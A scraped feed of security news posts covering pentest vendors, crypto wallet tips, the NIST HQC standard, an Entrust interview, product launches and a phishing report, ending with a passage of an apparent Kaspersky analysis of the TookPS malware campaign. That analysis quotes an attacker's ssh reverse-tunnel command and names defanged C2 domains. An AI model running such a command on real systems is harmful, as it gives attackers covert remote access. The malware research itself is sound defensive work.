Ensure Compliance</b><b><br />\n</b></h3>\n<p><span style=\"font-weight: 400;\">Regular web application penetration testing helps businesses meet regulatory compliance standards for cybersecurity. For example, businesses may need to comply with GDPR, PCI-DSS, or HIPAA regulations, all of which require robust data protection measures.</span></p>\n<p>&nbsp;</p>\n<h3><b>5. Protect Customer Trust</b><b><br />\n</b></h3>\n<p><span style=\"font-weight: 400;\">Customers trust businesses to handle their personal data responsibly. Ensuring your web applications are secure reinforces this trust and shows your commitment to protecting customer information.</span></p>\n<p>&nbsp;</p>\n<h2><b>Frequently Asked Questions (FAQs)</b></h2>\n<h3>What is the difference between penetration testing and vulnerability scanning?</h3>\n<p>Penetration testing involves ethical hackers attempting to exploit vulnerabilities, simulating the tactics of cybercriminals. Vulnerability scanning, on the other hand, automatically detects weaknesses but does not attempt to exploit them.</p>\n<h3>How often should web application penetration testing be conducted?</h3>\n<p>It&#8217;s recommended to conduct penetration testing at least once a year or whenever there are significant changes to the web application. However, more frequent testing may be needed for high-risk applications.</p>\n<h3>How much does web application penetration testing cost?</h3>\n<p>Costs vary depending on the complexity of the web application and the scope of the testing. On average, web application penetration testing can range from £2,000 to £30,000 for a comprehensive assessment.</p>\n<h3>Will penetration testing disrupt my web application’s normal operations?</h3>\n<p>Penetration tests are designed to simulate real-world attacks without affecting the functionality of your web application. The goal is to identify vulnerabilities without causing any disruption to services.</p>\n<h3>How do I interpret the results of a penetration test?</h3>\n<p>The results will include a detailed report outlining discovered vulnerabilities, their severity, and recommendations for remediation. It’s best to work with your security team or a cybersecurity expert to address these findings.</p>\n<p>&nbsp;</p>\n<h3>Useful Guides</h3>\n<blockquote class=\"wp-embedded-content\"><p><a href=\"https://www.itsecurityguru.org/2024/05/12/how-to-make-your-website-safer-for-users-and-websites-that-hold-business-data-and-information/\">How To Make Your Website Safer For Users And Websites That Hold Business Data And Information</a></p></blockquote>\n<p></p>\n<blockquote class=\"wp-embedded-content\"><p><a href=\"https://www.itsecurityguru.org/2025/03/01/essential-measures-consider-it-security/\">Essential Measures To Consider For IT Security</a></p></blockquote>\n<p></p>\n<blockquote class=\"wp-embedded-content\"><p><a href=\"https://www.itsecurityguru.org/2024/06/22/role-automated-tools-saas-penetration-testing/\">The Role of Automated Tools in SaaS Penetration Testing</a></p></blockquote>\n<p></p>\n<p>The post <a href=\"https://www.itsecurityguru.org/2025/03/28/top-5-web-application-penetration-testing-companies-uk/\">Top 5 Web Application Penetration Testing Companies UK</a> appeared first on <a href=\"https://www.itsecurityguru.org\">IT Security Guru</a>.</p>",

        "content": "<p><span style=\"font-weight: 400;\">Cryptocurrency will be more popular in 2025 than it has ever been and this means that there is a greater need for wallet security. As the crypto sector becomes more profitable and popular, malicious actors will look to exploit investors and steal their funds through methods like phishing schemes, wallet hacks, and so on.</span></p>\n<p><span style=\"font-weight: 400;\">Then there is the risk of users themselves making mistakes and losing their tokens within the blockchain. To avoid losing your money, we&#8217;ve compiled some tips for every crypto user that will keep their funds safe in the short and long term.</span></p>\n<h2><span style=\"font-weight: 400;\">1. Choose The Best Wallet Possible</span></h2>\n<p><span style=\"font-weight: 400;\">The very first step to crypto wallet security is choosing a good wallet. It&#8217;s often been said that you should never leave your tokens on exchanges indefinitely but instead, should use a reputable crypto wallet. Do some research to find the </span><a href=\"https://apps.apple.com/us/app/best-wallet-bitcoin-crypto/id6451312105\"><span style=\"font-weight: 400;\">best bitcoin wallet 2025</span></a><span style=\"font-weight: 400;\"> has to offer, with great security features, easy accessibility, and support for multiple assets and networks.</span></p>\n<p><span style=\"font-weight: 400;\">In general, you need to choose a wallet that is compatible with the tokens you want to use. A wallet that isn&#8217;t compatible with Dogecoin, for example, is of no use to you if Dogecoin is your preferred token. </span></p>\n<p><span style=\"font-weight: 400;\">Paper wallets, cold wallets, and hot wallets are the various wallet formats in the industry and while cold wallets are considered the most secure, they may not be the best option for you. As such, choose a wallet in the format you’re most comfortable with. You also want to read reviews of any wallets you are considering. Look at the overall rating of the wallet on consumer websites and search for your most pressing issues within consumer reviews. If, for example, user functionality is your biggest issue, you want to look at this in all of the reviews.</span></p>\n<h2><span style=\"font-weight: 400;\">2. Set Up A Password And Recovery  Phrase</span></h2>\n<p><span style=\"font-weight: 400;\">When you choose </span><a href=\"https://www.itsecurityguru.org/2024/04/02/can-crypto-more-secure-fiat/\"><span style=\"font-weight: 400;\">a secure cryptocurrency wallet</span></a><span style=\"font-weight: 400;\">, you will be prompted to enter a password and create a recovery phrase for it. The password needs to be as complex as possible so that it is hard to guess. Obviously, password12345 is not a suitable option, neither are obvious things like your birthday or your name. Instead, use a combination of numbers, letters and symbols that is much harder for anyone to guess. Your recovery phrase will be shown to you as you set up your wallet and make sure this information is kept safe. </span></p>\n<p><span style=\"font-weight: 400;\">There are countless examples of people losing their passwords and recovery phrases and thus, the money in their wallets. Once you&#8217;ve set up these, </span><a href=\"https://blog.kraken.com/product/introducing-icloud-backup-for-kraken-wallet\"><span style=\"font-weight: 400;\">write them down in a secure place</span></a><span style=\"font-weight: 400;\"> and make sure no one else gets access to them. The thing to always remember about crypto wallets is that once you lose access to them, not even your wallet creator can help you regain it, so take caution.</span></p>\n<p><img alt=\"world password day\" class=\"alignnone wp-image-18510 size-large\" height=\"536\" src=\"https://www.itsecurityguru.org/wp-content/uploads/2016/11/How-to-choose-a-strong-password-fb-1024x536.jpg\" width=\"1024\" /></p>\n<h2><span style=\"font-weight: 400;\">3. Avoid Phishing Schemes</span></h2>\n<p><span style=\"font-weight: 400;\">Criminals are always trying to gain access to hot wallets via phishing schemes. These essentially involve </span><a href=\"https://decrypt.co/250854/openai-twitter-hack-crypto-scam\"><span style=\"font-weight: 400;\">tricking crypto investors into clicking dodgy links</span></a><span style=\"font-weight: 400;\"> that grant criminals access to their wallets. Once they have this access, they proceed to drain the wallet of all of its funds, leaving the owner stranded. Your best bet is to get educated about phishing schemes and learn how to spot the signs. </span></p>\n<p><span style=\"font-weight: 400;\">Some common indicators that you&#8217;ve encountered a phishing scheme include glaring grammatical and spelling mistakes in supposedly official emails and messages, inconsistent email addresses, the promise of free prizes with a short time to claim, and so on. Learning to spot these means that you are less likely to click on these links and lose your money. If you are unsure if a link is part of a phishing scheme or not, always err on the side of caution.</span></p>\n<h2><span style=\"font-weight: 400;\">4. Keep Your Physical Wallet Safe</span></h2>\n<p><span style=\"font-weight: 400;\">While cold wallets are nearly impossible to hack, they can get lost. In fact, there have been cases of people losing millions of dollars and crypto </span><a href=\"https://www.bbc.com/news/articles/cj0r0dvgpy0o\"><span style=\"font-weight: 400;\">after their physical wallets got missing</span></a><span style=\"font-weight: 400;\"> or damaged. Your best bet is to treat your hardware wallets the way you would any other valuable physical item. Keep it in a cool dry secure area that only you can access at any time. If you want to go the extra mile, you can even put it in a safety deposit box with your other valuables. If the wallet is kept safe, the funds within it will always be accessible to you. </span></p>\n<p>The post <a href=\"https://www.itsecurityguru.org/2025/03/28/4-tips-for-crypto-wallet-security/\">4 Tips For Crypto Wallet Security</a> appeared first on <a href=\"https://www.itsecurityguru.org\">IT Security Guru</a>.</p>",

        "content": "<p class=\"\">The National Institute of Standards and Technology (NIST) has officially added HQC (Hamming Quasi-Cyclic), co-invented by SandboxAQ, to its suite of post-quantum cryptographic (PQC) standards, the company announced today.</p>\n<p class=\"\">HQC becomes the fifth algorithm selected by NIST in its ongoing effort to develop quantum-resistant encryption standards. Of the five, three will serve digital signature purposes, while HQC and ML-KEM will be used to secure the confidentiality of communications — protecting everything from Internet traffic and cellular networks to payment systems and other critical infrastructure.</p>\n<p class=\"\">This milestone marks the second time a SandboxAQ-developed algorithm has been selected by NIST, following the 2022 inclusion of SPHINCS+. It reinforces the company’s growing influence in defining the global standard for quantum-safe cryptography.</p>\n<p class=\"\"><em>“HQC has foundations in coding theory that offer strong theoretical and practical protection against known quantum decryption methods, while its efficient performance profile makes it well-suited to real-world adoption,”</em> said Taher Elgamal, a partner at Evolution Equity Partners and senior advisor at SandboxAQ, who is colloquially called ‘the father of SSL’. <em>“With SPHINCS+ and HQC both standardized by NIST, SandboxAQ has solidified its leadership in developing effective PQC solutions for enterprises and government agencies. This is not just a milestone for SandboxAQ, it’s a win for global security in the face of future quantum disruption.&#8221;</em></p>\n<p class=\"\">HQC is a key encapsulation mechanism designed to protect encryption key exchanges against quantum-enabled attacks. Unlike traditional public-key cryptosystems like RSA and elliptic-curve cryptography (ECC) — which are expected to be broken by quantum computing — HQC relies on error-correcting codes, a class of mathematical problems believed to be resistant to quantum threats. According to NIST’s final selection report, HQC stood out for its strong security guarantees, computational efficiency, and scalable performance, making it a robust candidate for widespread implementation.</p>\n<p class=\"\"><em>&#8220;We began developing HQC in the 2000s, and by the 2010s, we had demonstrated that this protocol resolved a 40-year-old open problem in code-based key exchanges. Today, HQC stands as one of only two protocols securing the confidentiality of nearly all global communications,”</em> said Carlos Aguilar Melchor, chief cybersecurity scientist at SandboxAQ. <em>“At SandboxAQ, we’ve long championed the importance of standardization, and contributing to two of the five NIST PQC standards reflects our commitment to shaping the future of cryptography.&#8221;</em></p>\n<p class=\"\">The addition of HQC to the NIST standards suite represents a significant step forward in the global transition to quantum-resilient cybersecurity. It also further cements SandboxAQ’s reputation as a pioneer in the field, combining groundbreaking cryptographic research with practical, scalable solutions for both the public and private sectors.</p>\n<p class=\"\">Beyond its contributions to cryptographic standards, SandboxAQ also delivers enterprise-grade cryptography management through its flagship product, AQtive Guard. Trained on billions of cryptographic findings and enriched by its in-house cryptography experts, AQtive Guard enables deep visibility into cryptographic assets through a unique AI-driven engine, integrated seamlessly into third-party systems. It helps organizations identify vulnerabilities, ensure compliance, and mitigate risk with proactive cryptographic posture management.</p>\n<p class=\"\">With HQC now part of the NIST standard and AQtive Guard driving secure deployments, SandboxAQ continues to lead the way in preparing the digital world for the quantum era.</p>\n<p>The post <a href=\"https://www.itsecurityguru.org/2025/03/27/sandboxaq-strengthens-leadership-in-post-quantum-security-as-nist-approves-hqc-algorithm/\">SandboxAQ Strengthens Leadership in Post-Quantum Security as NIST Approves HQC Algorithm</a> appeared first on <a href=\"https://www.itsecurityguru.org\">IT Security Guru</a>.</p>",

        "content": "<p>The Gurus spoke to Robert Hann, VP of Technical Solutions at <a href=\"https://www.entrust.com/?edc_sfid=701Vn000005usvhIAA&amp;gad_source=1&amp;gclid=Cj0KCQjw1um-BhDtARIsABjU5x4icUydj4atVvhWenJp93nOSjRXhvB9e2DdeqFrqBPq798Gby_frTcaAkuiEALw_wcB\">Entrust, </a>about the future of IT and the challenges these developments pose to security teams and business leaders globally.</p>\n<p><strong>What do you think will be the most significant changes in the IT industry over the next 5-10 years?</strong></p>\n<p>I believe the three most influential and interconnected evolutions that will transform the IT industry throughout the next decade are AI, Robotics and Quantum Computing. The last decade has seen the advent of “consumable” AI, triggering mass adoption and application in our business and personal lives. The pace of AI maturity as it enters its eighth decade has led industry experts to name this the “intelligent era” and I wholeheartedly agree.</p>\n<p>Until the last ten years or so, we would largely categorise robots as “reactive” with mostly industrial applications in areas like manufacturing or warehousing. I recall my first job as a Chocolate Engineer in the mid 90’s where I was wowed by robotic packaging systems and couldn’t even imagine then how we now apply robots to achieve huge efficiency and quality advances across our industries today. With the Autonomous capabilities that AI/ML is making real, ever more impressive applications for robots are now applied and most notably in our digital landscapes with Agentic AI poised to re-architect the workforce in the years ahead.</p>\n<p>Autonomous AI agents as our workforces or perhaps as the foot soldiers to decentralised applications in a Web 3.0 world, represent perhaps the most disruptive technology to transform IT, our industries and how businesses operate. At an individual level, this will change how we interact with each other as citizens, with our governments, perform our jobs and consume goods and services. Throw in the advent of Quantum Computing in this same timeframe and we should expect to realise both superpowered AI and superpowered autonomous machines.</p>\n<p>This transformation comes with immense responsibility from our business, IT and especially cybersecurity professionals to keep data safe and their colleagues, friends and family members protected from fraud and intrusion of privacy. Verified Identity, access permission controls, data encryption are all challenges for the cybersecurity industry in a world of autonomous machines!</p>\n<p>&nbsp;</p>\n<p><strong>With AI evolving rapidly, what new cybersecurity challenges will IT professionals need to tackle?</strong></p>\n<p>It is already abundantly evident that AI is both a force for good and bad. Where the adversary possesses equivalent superpowers, the Captain America of the modern cybersecurity team must neutralise their nemesis by also using AI in layered and more sophisticated ways. To name a few examples of how we are using AI as a greater defense for cyber risk and resilience, we see AI-driven capabilities from leaders in threat detection/response, behavioural analysis in machine/user authentication, predictive analytics for vulnerability management, endpoint security, automated threat intelligence, information sharing, and deepfake detection.</p>\n<p>The increasing deployment of deepfakes highlights a concerning trend  where AI, in the hands of sophisticated fraudsters, produces convincing deepfakes of people and their voices. This has led to numerous financial losses as demonstrated by <a href=\"https://www.ft.com/content/b977e8d4-664c-4ae4-8a8e-eb93bdf785ea\">Arup’s</a> headline fraud case. Referencing Entrust’s own <a href=\"https://www.entrust.com/resources/reports/identity-fraud-report\">2025 Identity Fraud Report</a>, there is a deepfake attempt every 5 minutes. However, in a classic good versus evil showdown, AI also delivers the most effective defense by detecting subtle differences between authentic and synthetic IDs and in the ID document verification as part of the onboarding stage.</p>\n<p><strong>As technology continues to advance, which ethical considerations do you think will become most pressing?</strong></p>\n<p>While leveraging AI technology to combat fraud, enhance cyber resilience, revolutionise business operations, and accelerate discoveries in fields like drug development, material science, and healthcare, it is crucial to prioritise ethical considerations. Ensuring that AI systems are transparent, accountable, and effectively trained and retrained to mitigate bias is essential for maintaining public trust and ensuring fair and equitable treatment of individuals, whether as employees or citizens.</p>\n<p>Large language models (LLMs) are just beginning to deliver for enterprises as organisations test and scale to realise their productivity and creativity potential. Thankfully, save for more rigor, some advanced data authenticity approaches and monitoring for malware injection, our tried and tested data-centric security and data privacy best practices apply. Notably, while cybersecurity professionals do not have to tackle AI ethical issues or the inherent biases in LLMs born from their internet and enterprise data training, the cybersecurity community can benefit from addressing these biases. This calls for, among other things, a &#8220;human in the loop.&#8221; The interaction between humans and agentic AI (AI systems and models that can act autonomously) poses identity management challenges, such as using public key infrastructure (PKI) to verify an AI agent to the systems it needs to interact with, as well as dynamic access controls around context and privilege timeouts. Therefore, a human in the loop is essential for robust cyber defenses.</p>\n<p>Even more challenging questions will emerge in the next 5-10 years as commercial use of Quantum Computers begins, making our current AI applications and defenses seem rudimentary. Around that time, we may start to answer Alan Turing&#8217;s question from 1950, &#8220;Can machines think?&#8221; with a &#8220;Yes, in more ways we are prepared for.&#8221; Note that I am not predicting fully conscious, sentient machines, like those in Terminator and Skynet. However, with such significant advances, human oversight and the skills needed to provide such controls while not stifling autonomy, will likely be the kind of expertise we see on the resumes of our children.</p>\n<p>&nbsp;</p>\n<p><strong>What cybersecurity skills will be most valuable for IT professionals to develop in the face of these emerging threats?</strong></p>\n<p>It&#8217;s clear that AI will dominate the skills list, but it&#8217;s not just about having AI knowledge. It&#8217;s about integrating intelligent and autonomous systems into business workflows to support decision-making and innovate with large language or quantitative datasets. However, AI is a double-edged sword. Our adversaries are equipped with AI but are not constrained by budget, legal, and ethical factors and will use it against us far beyond phishing and deep fake scenarios for ID compromise led attacks. Therefore, the cybersecurity community must upskill in network security, threat detection, post-quantum ready encryption, and uncovering vulnerabilities to minimise zero-day scenarios.</p>\n<p>Quantum computing skills will also be crucial in the next decade, both defensively and in application. Quantum programming languages and hardware will be new to most, and when combined with AI (QAI) to tackle sophisticated problems, our adversaries will be right there with us.</p>\n<p>The advent of quantum computing is a wake-up call for the cybersecurity industry. Every organisation must immediately begin migrating from classical public key cryptography to post-quantum cryptography (PQC). This is no easy task, given a long history of laissez-faire focus and spotty visibility across digital certificates, crypto libraries, protocols, keys, and algorithms. To clarify for the non-technical, the crypto assets we refer to are not bitcoins or fungible assets, but the ones that are the very fabric of data security. IT professionals must first learn to find these assets across complex landscapes of products, services, cloud environments, and code. PQ Readiness support and advice will be in great demand as much as skills in crypto agility, both as a post-quantum cryptography migration step and defense mechanism.</p>\n<p>We haven’t witnessed anything as transformative in cryptography in 50 years as this fundamental shift across our IT infrastructure. This will catch some business leaders off guard in the next 2-3 years with a 2030 migration deadline looming. Once discovered and the PQ vulnerable assets migrated to PQC, AI will help keep that continuous crypto inventory accurate and use crypto agility to mitigate threats.</p>\n<p>&nbsp;</p>\n<p><strong>What are the biggest threats posed by quantum computing to current encryption methods, and how can organisations prepare?</strong></p>\n<p>48 years ago, MIT colleagues Ron Rivest, Adi Shamir, and Leonard Adleman invented the RSA algorithm and it remains the Swiss Army knife of public key encryption today. RSA’s primary vehicle for usage is PKI which issues the digital certificates used so extensively to protect data  and provide trust across infrastructures. Other successful public key algorithms have come along, such as Elliptic Curve (ECDSA, EdDSA) in 2004, which have gained adoption such as for bitcoin or biometric passports, but none are as universally adopted as RSA.</p>\n<p>The sheer number of instances of public key encryption in use today is impossible to quantify. To give a sense of scale, a single major organisation can easily have hundreds of thousands, as it forms the backbone of their data and identity-centric security strategies. By 2030, the millions of these encryption instances – embedded into chips, networks, applications, cloud, operating systems, and code etc – must be migrated to PQC. Given the scale of this endeavour and the time it takes to discover, test and migrate to PQC, organisations have turned to Entrust as the pioneers of PKI and hardware security modules (HSMs) over 25 years ago.</p>\n<p>An interesting use case which we are running at scale with multiple financial institutions in Europe right now is using our PQ Ready time stamping authority to add PQC protection to long life digital assets such as contracts and blockchain ledgers i.e. for smart contracts. This solution is addressing one of the two immediate quantum threats which is harvest now-decrypt later where an adversary, a patient one, steals encrypted assets ready to decrypt or manipulate them later. The other threat, long life connected devices such as cars, is another where our PQ ready solutions are already in play.</p>\n<p>Trust infrastructures like PKIs and their HSMs are long-term investments, which is why organisations must future-proof today to ensure a smooth transition to the quantum age when the time inevitably comes. As any boy scout would say, ‘be prepared’!</p>\n<p>The post <a href=\"https://www.itsecurityguru.org/2025/03/26/qa-cybersecurity-in-the-intelligent-era/\">Q&#038;A: Cybersecurity in ‘The Intelligent Era’</a> appeared first on <a href=\"https://www.itsecurityguru.org\">IT Security Guru</a>.</p>",

IT teams are often stretched, while c-suite executives don’t fully understand how technical misconfigurations, or a lack of certain controls, could impact their business. vSOC Assure has been developed to address these challenges, making it easier to identify, track and manage risks. The platform streamlines cyber risk assessments across an organisation’s entire digital environment, while delivering action points for c-suite and technical teams to improve resilience,” said Simon Kean, Commercial Director at Data Connect.</p>\n<p>The service carries out an in-depth assessment on an organisation’s security posture, benchmarked against globally-recognised frameworks. The risks are then communicated back to the organisation alongside a clear and structured roadmap for remediation, which ensures organisations have an action plan set to address issues effectively.</p>\n<p>The service is also designed to bridge communication gaps between IT leaders and c-suite executives. This ensures that employees at every level are delivered information relevant to their understanding of risk, while empowering them to play a key role in improving organisational cyber maturity.</p>\n<p>“We offer support to organisations after the assessment, helping them prioritise risks and make recommendations on the best steps for mitigation. No security posture is ever perfect, security is a journey, not a destination, but with our support, organisations can navigate that journey safely while making continuous progress towards resilience,” continued Kean.</p>\n<p>The post <a href=\"https://www.itsecurityguru.org/2025/03/25/data-connect-announces-vsoc-assure-to-streamline-cyber-risk-assessments-and-increase-cyber-resilience/\">Data Connect announces vSOC Assure to streamline cyber risk assessments and increase cyber resilience</a> appeared first on <a href=\"https://www.itsecurityguru.org\">IT Security Guru</a>.</p>",

        "content": "<p><a href=\"https://www.knowbe4.com/\">KnowBe4</a>, Security Awareness Training leader, today launched its Phishing Threat Trend Report, detailing key trends, new data, and threat intelligence insights surrounding phishing threats targeting organisations at the start of 2025.</p>\n<p>Based on data generated by KnowBe4 Defend, this edition highlights the growing threat of ransomware and explores how cybercriminals are using sophisticated tactics to bypass native security and secure email gateways (SEGs). It also examines how AI is being leveraged to create polymorphic phishing campaigns, how attackers are infiltrating the hiring process to access systems and data, and the increasing success of attacks evading traditional defences.</p>\n<p><strong>Key Findings From the Report:</strong></p>\n<ul class=\"ql-agpr-list\">\n<li class=\"ql-indent-0 ql-agpr-list-item\">Between September 15, 2024 and February 14, 2025 there was a 17.3% increase in phishing emails compared to the previous six months.</li>\n<li class=\"ql-indent-0 ql-agpr-list-item\">82.6% of all phishing emails analysed exhibited some use of AI.</li>\n<li class=\"ql-indent-0 ql-agpr-list-item\">The report observes a 22.6% increase in ransomware payloads.</li>\n<li class=\"ql-indent-0 ql-agpr-list-item\">The phishing hyperlink, malware, and social engineering payloads getting through traditional detection have surged, with phishing hyperlinks increasing by 36.8%, malware by 20%, and social engineering tactics by 14.2% compared to the previous six months.</li>\n<li class=\"ql-indent-0 ql-agpr-list-item\">Additionally, there has been a 57.9% increase in attacks being sent from compromised accounts getting through traditional detection.</li>\n<li class=\"ql-indent-0 ql-agpr-list-item\">The top five legitimate platforms used to send phishing emails include DocuSign, Paypal, Microsoft, Google Drive, and Salesforce.</li>\n<li class=\"ql-indent-0 ql-agpr-list-item\">Currently the most impersonated brands include Microsoft, Docusign, Adobe, Paypal, and LinkedIn.</li>\n</ul>\n<p>The report examines the unprecedented scale of polymorphic phishing tactics, now present in 76.4% of all phishing campaigns, which use AI-generated variations to bypass traditional security measures. Meanwhile, ransomware payloads in phishing attacks have risen by 22.6% over six months, with a sharp 57.5% increase in just three months—exemplified by a sophisticated INC Ransom payload detected by KnowBe4 Defend. The research also highlights how cybercriminals are increasingly targeting the hiring process, with 64% of attacks focused on engineering roles, exploiting their access to critical systems and data.</p>\n<p>“As ever, innovation in phishing threats and defences is accelerating rapidly,” said Jack Chapman, SVP of threat intelligence at KnowBe4. “In this report, we have observed cybercriminals evolving their tactics, leveraging ransomware and polymorphic campaigns with new strategies to evade detection by both traditional and advanced technologies. As we move through 2025, both phishing threats and defences will continue to evolve, emphasising a holistic approach that integrates technical defences with human risk management. A strong security culture starts with detection but is reinforced by awareness, continuous education, and adaptive technology.”</p>\n<p>The Phishing Threat Trends Report, Vol 5 is available for download <a href=\"https://www.knowbe4.com/hubfs/Phishing-Threat-Trends-2025_Report.pdf\">here</a>.</p>\n<p>This follows a <a href=\"https://www.itsecurityguru.org/2025/03/17/new-knowbe4-report-finds-education-sector-unprepared-for-escalating-cyberattacks/\">report</a> from KnowBe4 revealing how underprepared the education sector is for escalating cyberattacks.</p>\n<p>The post <a href=\"https://www.itsecurityguru.org/2025/03/20/new-knowbe4-report-reveals-a-spike-in-phishing-campaigns/\">New KnowBe4 Report Reveals a Spike in Phishing Campaigns</a> appeared first on <a href=\"https://www.itsecurityguru.org\">IT Security Guru</a>.</p>",

Let us delve into this. Upon infiltrating a victim&#8217;s device, the downloader reaches out to its C2 server, whose domain is embedded in its code, to retrieve a PowerShell script. Different malware samples communicate with different domains. For example, the file with the MD5 hash <a href=\"https://opentip.kaspersky.com/2AEF18C97265D00358D6A778B9470960/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______ea6dd96e9294f4e4&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">2AEF18C97265D00358D6A778B9470960</a> reached out to <a href=\"https://opentip.kaspersky.com/bsrecov4.digital/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______c3c052483e619c24&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">bsrecov4[.]digital</a>, which was inactive at the time of our research. It received the following base64-encoded command from that domain:</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_116022\" style=\"width: 1855px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31153826/tookps2.png\"><img alt=\"Original command\" class=\"size-full wp-image-116022\" height=\"195\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31153826/tookps2.png\" width=\"1845\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-116022\">Original command</p></div>\n<p>Decoding reveals the PowerShell command being executed:</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31153930/tookps3.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-116023\" height=\"367\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31153930/tookps3.png\" width=\"1843\" /></a></p>\n<p>The variable &#8220;$TookEnc&#8221; stores an additional base64-encoded data block, also executed in PowerShell. Decrypting this reveals the following command:</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_116024\" style=\"width: 926px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31154030/tookps4.png\"><img alt=\"Decoded command from $TookEnc variable shown in the previous screenshot\" class=\"size-full wp-image-116024\" height=\"39\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31154030/tookps4.png\" width=\"916\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-116024\">Decoded command from $TookEnc variable shown in the previous screenshot</p></div>\n<div class=\"wp-caption aligncenter\" id=\"attachment_116025\" style=\"width: 962px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31154116/tookps5.png\"><img alt=\"Example of decrypting another command from $TookEnc variable\" class=\"size-full wp-image-116025\" height=\"211\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31154116/tookps5.png\" width=\"952\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-116025\">Example of decrypting another command from $TookEnc variable</p></div>\n<p>Although different samples contain different URLs, the command structure remains identical. These commands sequentially download and execute three PowerShell scripts from the specified URL. The first script downloads &#8220;sshd.exe&#8221;, its configuration file (&#8220;config&#8221;), and an RSA key file from the C2 server. The second script retrieves command-line parameters for &#8220;sshd&#8221; (remote server address, port, and username), and then runs &#8220;sshd&#8221;.</p>\n<p>Example of a malicious PowerShell command generated by the PowerShell script:</p><pre class=\"crayon-plain-tag\">ssh.exe -N -R 41431:localhost:109 Rc7DexAU73l@$ip_address -i \"$user\\.ssh\\Rc7DexAU73l.41431\" -f \"$user\\.ssh\\config\"</pre><p>\nThis command starts an SSH server, thereby establishing a tunnel between the infected device and the remote server. For authentication, it uses the RSA key downloaded earlier, and the server configuration is sourced from the &#8220;config&#8221; file. Through this tunnel, the attacker gains full system access, allowing for arbitrary command execution.</p>\n<p>The third script attempts to download a modified version of the Backdoor.Win32.TeviRat malware onto the victim&#8217;s machine, which is a well-known backdoor. The sample we obtained uses <a href=\"https://attack.mitre.org/techniques/T1574/002\" rel=\"noopener\" target=\"_blank\">DLL sideloading</a> to modify and deploy the TeamViewer remote access software onto infected devices. In simple terms, the attackers place a malicious library in the same folder as TeamViewer, which alters the software&#8217;s default behavior and settings, hiding it from the user and providing the attackers with covert remote access. This campaign used the domain <a href=\"https://opentip.kaspersky.com/invoicingtools.com/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______3e3c87f2191c192a&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">invoicingtools[.]com</a> as the C2.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_116026\" style=\"width: 560px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31154328/tookps6.png\"><img alt=\"Part of the script that downloads Backdoor.Win32.TeviRat\" class=\"size-full wp-image-116026\" height=\"713\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31154328/tookps6.png\" width=\"550\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-116026\">Part of the script that downloads Backdoor.Win32.TeviRat</p></div>\n<p>Additionally, Backdoor.Win32.Lapmon.* is downloaded onto the compromised device. Unfortunately, we were not able to establish the exact delivery method. This backdoor uses the domain <a href=\"https://opentip.kaspersky.com/twomg.xyz/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______dc392203e86b07fb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">twomg[.]xyz</a> as its C2.</p>\n<p>In this manner, the attackers gain complete access to the victim&#8217;s computer in variety of ways.</p>\n<h2 id=\"infrastructure\">Infrastructure</h2>\n<p>The malicious scripts and programs in this attack primarily used domains registered in early 2024, hosted at two IP addresses:</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_116027\" style=\"width: 1210px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31154454/tookps7.png\"><img alt=\"C2 domains and corresponding IPs\" class=\"size-full wp-image-116027\" height=\"478\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/31154454/tookps7.png\" width=\"1200\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-116027\">C2 domains and corresponding IPs</p></div>\n<p>We found no legitimate user-facing resources at these IP addresses. Alongside the campaign-related domains, we also found other domains long blocked by our security solutions. This strongly suggests these attackers had used other tools prior to TookPS, Lapmon, and TeviRat.</p>\n<h2 id=\"takeaways\">Takeaways</h2>\n<p>The DeepSeek lure attacks were merely a glimpse into a large-scale campaign targeting both home users and organizations. The malware distributed by the attackers was disguised as popular software, including business-critical applications. They attempted to gain covert access to the victim&#8217;s device through a variety of methods after the initial infection.</p>\n<p>To protect against these attacks, users are advised to remain vigilant and avoid downloading pirated software, which may represent a serious threat.</p>\n<p>Organizations should establish robust security policies prohibiting software downloads from dubious sources like pirated websites and torrents. Additionally, regular security awareness training is essential for ensuring a proper level of employee vigilance.</p>\n<h2 id=\"iocs\">IOCs</h2>\n<p><strong>MD5</strong><br />\n<a

